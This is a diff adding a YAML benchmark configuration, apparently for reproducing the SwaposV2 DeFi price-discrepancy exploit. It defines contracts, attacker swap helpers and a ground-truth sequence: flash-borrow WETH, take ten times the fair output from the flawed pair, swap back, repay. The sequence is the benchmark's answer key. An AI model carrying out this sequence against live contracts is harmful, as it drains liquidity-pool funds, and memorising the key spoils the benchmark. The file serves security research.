@@ -1,0 +1,87 @@
+# Information for benchmarks building.
+project_name: "SwaposV2"
+
+ctrt_name2cls:
+  - ["weth", "WETH"]
+  - ["swapos", "Swapos"]
+  - ["pair", "UniswapV2Pair"]
+  - ["spair", "SwaposV2Pair"]
+  - ["factory", "UniswapV2Factory"]
+  - ["router", "UniswapV2Router"]
+
+ctrt_name2deploy:
+  - ["weth", ""]
+  - ["swapos", "new Swapos()"]
+  - ["pair", ""]
+  - [
+      "spair",
+      "new SwaposV2Pair(
+      address(swapos),
+      address(weth),
+      reserve0pair,
+      reserve1pair,
+      blockTimestampLastpair,
+      kLastpair,
+      price0CumulativeLastpair,
+      price1CumulativeLastpair)",
+    ]
+  - ["factory", ""]
+  - ["router", ""]
+
+extra_actions:
+  - 'function swap_spair_attacker_weth_swapos(uint256 amount, uint256 amountOut) internal eurus {
+    weth.transfer(address(spair), amount);
+    spair.swap(amountOut, 0, address(attacker), "");
+    }'
+
+  - 'function swap_spair_attacker_swapos_weth(uint256 amount, uint256 amountOut) internal eurus {
+    swapos.transfer(address(spair), amount);
+    spair.swap(0, amountOut, address(attacker), "");
+    }'
+
+extra_deployments: []
+extra_statements: []
+
+attack_goal_str: "weth"
+
+groundtruth:
+  - ["borrow", "weth", "owner", "3e18"]
+  - [
+      "swap",
+      "spair",
+      "attacker",
+      "weth",
+      "swapos",
+      "weth.balanceOf(attacker)",
+      "pair.getAmountOut(weth.balanceOf(attacker), address(weth)) * 10",
+    ]
+  - ["swap", "pair", "attacker", "swapos", "weth", "swapos.balanceOf(attacker)", "pair.getAmountOut(swapos.balanceOf(attacker), address(swapos))"]
+  - ["payback", "weth", "owner", "3e18 * 1003 / 1000"]
+
+# Information for search space building.
+roles:
+  "weth":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: true
+  "swapos":
+    is_asset: true
+    is_erc20: true
+    is_stablecoin: false
+  "pair":
+    is_swappair: true
+    is_uniswap: true
+    token_pair: ["swapos", "weth"]
+    support_swaps:
+      "swapos": ["swapos", "weth"]
+      "weth": ["swapos", "weth"]
+    is_lendpool: true
+  "spair":
+    is_swappair: true
+    token_pair: ["swapos", "weth"]
+    support_swaps:
+      "swapos": ["swapos", "weth"]
+      "weth": ["swapos", "weth"]
+    is_lendpool: true
+
+pattern: "Price Discrepancy"
